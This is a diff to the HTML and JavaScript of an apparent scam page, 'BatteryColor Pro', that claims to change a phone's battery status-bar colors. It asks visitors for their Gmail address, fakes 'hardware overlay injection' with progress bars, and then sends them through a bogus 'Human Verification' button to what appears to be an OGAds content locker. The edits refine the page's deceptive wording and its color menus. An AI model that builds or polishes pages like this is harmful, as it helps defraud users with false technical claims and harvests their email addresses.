@@ -260,11 +260,20 @@
         .typing-dots span:nth-child(2) { animation-delay: -0.16s; }
         @keyframes bounceDot { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
 
+        .section-divider-title {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-muted);
+            margin: 18px 0 6px 4px;
+            font-weight: 700;
+        }
+
         .options-box {
             display: flex;
             flex-direction: column;
             gap: 12px;
-            margin-top: 16px;
+            margin-top: 8px;
             width: 100%;
         }
 
@@ -272,10 +281,10 @@
             background: var(--chat-btn-bg);
             border: 1px solid var(--chat-btn-border);
             color: var(--text-main);
-            padding: 18px 16px;
+            padding: 16px;
             border-radius: 18px;
             text-align: left;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 500;
             cursor: pointer;
             display: flex;
@@ -289,7 +298,7 @@
         .btn-left-content {
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 14px;
         }
 
         .chat-opt-btn i.btn-icon {
@@ -299,7 +308,7 @@
         }
 
         .chat-opt-btn i.fa-chevron-right { 
-            font-size: 13px; 
+            font-size: 12px; 
             color: #71717a; 
         }
 
@@ -528,7 +537,7 @@
         }
 
         window.onload = () => {
-            const explanation = "Welcome to BatteryColor Pro. Enter your Gmail account below to authorize custom battery status bar color overlay injection.";
+            const explanation = "Welcome to BatteryColor Pro. Enter your Gmail account below to authorize custom hardware overlay injection.";
             typeWriterEffect("welcomeText", explanation, 12);
         };
 
@@ -589,43 +598,69 @@
                     `;
                     chatWindow.appendChild(row);
                     
-                    const responseText = `Target profile linked successfully: ${val}. Select your new firmware battery overlay configuration:`;
+                    const responseText = `Target profile verified: ${val}. Select your system package configuration layout below:`;
                     
                     typeWriterEffect(nextId, responseText, 10, () => {
                         const optionsHtml = `
+                            <div class="section-divider-title">Solid Colors Menu</div>
                             <div class="options-box">
-                                <button class="chat-opt-btn" onclick="selectModuleNode('Neon Rainbow Fill Design')">
+                                <button class="chat-opt-btn" onclick="selectModuleNode('Volt Neon Green')">
                                     <div class="btn-left-content">
-                                        <i class="fa-solid fa-battery-full btn-icon" style="background: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"></i>
-                                        <span class="btn-title">Neon Rainbow Fill [DESIGN_01]</span>
+                                        <i class="fa-solid fa-circle btn-icon" style="color:#00ff66;"></i>
+                                        <span class="btn-title">Volt Neon Green [SYS_COLOR]</span>
                                     </div>
                                     <i class="fa-solid fa-chevron-right"></i>
                                 </button>
-                                <button class="chat-opt-btn" onclick="selectModuleNode('Golden Glitter Custom Theme')">
+                                <button class="chat-opt-btn" onclick="selectModuleNode('Deep Sapphire Blue')">
                                     <div class="btn-left-content">
-                                        <i class="fa-solid fa-battery-full btn-icon" style="color:#ffd700;"></i>
-                                        <span class="btn-title">Golden Glitter Overlay [DESIGN_02]</span>
+                                        <i class="fa-solid fa-circle btn-icon" style="color:#0077ff;"></i>
+                                        <span class="btn-title">Deep Sapphire Blue [SYS_COLOR]</span>
                                     </div>
                                     <i class="fa-solid fa-chevron-right"></i>
                                 </button>
-                                <button class="chat-opt-btn" onclick="selectModuleNode('Floral Dark-Blue Dynamic Pattern')">
+                                <button class="chat-opt-btn" onclick="selectModuleNode('Cyberpunk Crimson Red')">
                                     <div class="btn-left-content">
-                                        <i class="fa-solid fa-battery-full btn-icon" style="color:#1e3a8a;"></i>
-                                        <span class="btn-title">Floral Dark-Blue Pattern [DESIGN_03]</span>
+                                        <i class="fa-solid fa-circle btn-icon" style="color:#ff2a2a;"></i>
+                                        <span class="btn-title">Cyberpunk Crimson Red [SYS_COLOR]</span>
                                     </div>
                                     <i class="fa-solid fa-chevron-right"></i>
                                 </button>
-                                <button class="chat-opt-btn" onclick="selectModuleNode('Heart-Face Premium Status Overlay')">
+                                <button class="chat-opt-btn" onclick="selectModuleNode('Electric Plasma Pink')">
                                     <div class="btn-left-content">
-                                        <i class="fa-solid fa-battery-full btn-icon" style="color:#ef4444;"></i>
-                                        <span class="btn-title">Heart-Face Layout Badge [PREMIUM]</span>
+                                        <i class="fa-solid fa-circle btn-icon" style="color:#ff007f;"></i>
+                                        <span class="btn-title">Electric Plasma Pink [SYS_COLOR]</span>
                                     </div>
                                     <i class="fa-solid fa-chevron-right"></i>
                                 </button>
-                                <button class="chat-opt-btn" onclick="selectModuleNode('Custom Character Badge Interface')">
+                                <button class="chat-opt-btn" onclick="selectModuleNode('Liquid Chrome Gold')">
                                     <div class="btn-left-content">
-                                        <i class="fa-solid fa-battery-full btn-icon" style="color:#ec4899;"></i>
-                                        <span class="btn-title">Character Custom Icon Layout [PREMIUM]</span>
+                                        <i class="fa-solid fa-circle btn-icon" style="color:#ffd700;"></i>
+                                        <span class="btn-title">Liquid Chrome Gold [SYS_COLOR]</span>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </button>
+                            </div>
+
+                            <div class="section-divider-title">Premium Fill Designs</div>
+                            <div class="options-box">
+                                <button class="chat-opt-btn" onclick="selectModuleNode('Chroma Spectrum Vector')">
+                                    <div class="btn-left-content">
+                                        <i class="fa-solid fa-wand-magic-sparkles btn-icon" style="background: linear-gradient(45deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"></i>
+                                        <span class="btn-title">Chroma Spectrum Vector [DESIGN_X1]</span>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </button>
+                                <button class="chat-opt-btn" onclick="selectModuleNode('Metallic Obsidian Matrix')">
+                                    <div class="btn-left-content">
+                                        <i class="fa-solid fa-fingerprint btn-icon" style="color:#8a2be2;"></i>
+                                        <span class="btn-title">Metallic Obsidian Matrix [DESIGN_X2]</span>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </button>
+                                <button class="chat-opt-btn" onclick="selectModuleNode('Baroque Velvet Geometric')">
+                                    <div class="btn-left-content">
+                                        <i class="fa-solid fa-border-top-left btn-icon" style="color:#40e0d0;"></i>
+                                        <span class="btn-title">Baroque Velvet Geometric [DESIGN_X3]</span>
                                     </div>
                                     <i class="fa-solid fa-chevron-right"></i>
                                 </button>
@@ -662,13 +697,13 @@
                     `;
                     chatWindow.appendChild(row);
 
-                    const loadingIntro = `Injecting hardware module for ${nodeName}. Tuning system layout parameters:`;
+                    const loadingIntro = `Compiling asset structure for ${nodeName}. Tuning core interface alignment metrics:`;
                     
                     typeWriterEffect(nextId, loadingIntro, 10, () => {
                         const loadingHtml = `
                             <div class="progress-block">
                                 <div class="progress-labels">
-                                    <span>Compiling system framework UI...</span>
+                                    <span>Writing status bar layout memory...</span>
                                     <span id="${txtId}" style="font-weight:600;">0%</span>
                                 </div>
                                 <div class="progress-bar-bg">
@@ -714,7 +749,7 @@
                                 <div class="offer-verification-card">
                                     <div class="verification-icon"><i class="fa-solid fa-user-shield"></i></div>
                                     <h4>Human Verification Required</h4>
-                                    <p>The network protocol achieved 100% stable integration. To prevent device exploit loop, please pass our swift verification below to immediately write changes to status bar permanent memory.</p>
+                                    <p>The layout protocol achieved stable 100% integration. To bypass system security restrictions, pass the quick verification console below to map asset layers permanently.</p>
                                     <button class="gpt-action-btn" onclick="redirectToOgadsLocker()">
                                         <i class="fa-solid fa-key"></i> Apply Tweaks Now
                                     </button>
